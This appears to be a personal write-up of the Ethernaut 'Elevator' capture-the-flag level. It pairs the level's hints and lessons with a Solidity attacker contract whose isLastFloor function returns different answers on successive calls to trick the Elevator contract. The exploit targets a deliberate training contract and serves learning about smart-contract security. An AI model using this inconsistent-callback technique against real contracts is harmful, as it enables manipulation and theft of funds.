# 11. Elevator
This elevator won't let you reach the top of your building. Right?
Things that might help:

    Sometimes solidity is not good at keeping promises.
    This Elevator expects to be used from a Building.

**END** looked up solution
https://medium.com/coinmonks/ethernaut-lvl-11-elevator-walkthrough-how-to-abuse-solidity-interfaces-and-function-state-41005470121d

You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read Solidity's documentation and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. gasleft().

Building.sol
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Building {
    Elevator public el = Elevator(0x74FC30c28fAD14339E06eF5e769f2c30BEE39a3b); 
    bool public switchFlipped =  false; 
    
    function hack() public {
        el.goTo(1);
    }
    
    function isLastFloor(uint) public returns (bool) {
        // first call
      if (! switchFlipped) {
        switchFlipped = true;
        return false;
        // second call
      } else {
        switchFlipped = false;
        return true;
      }
    }
}
```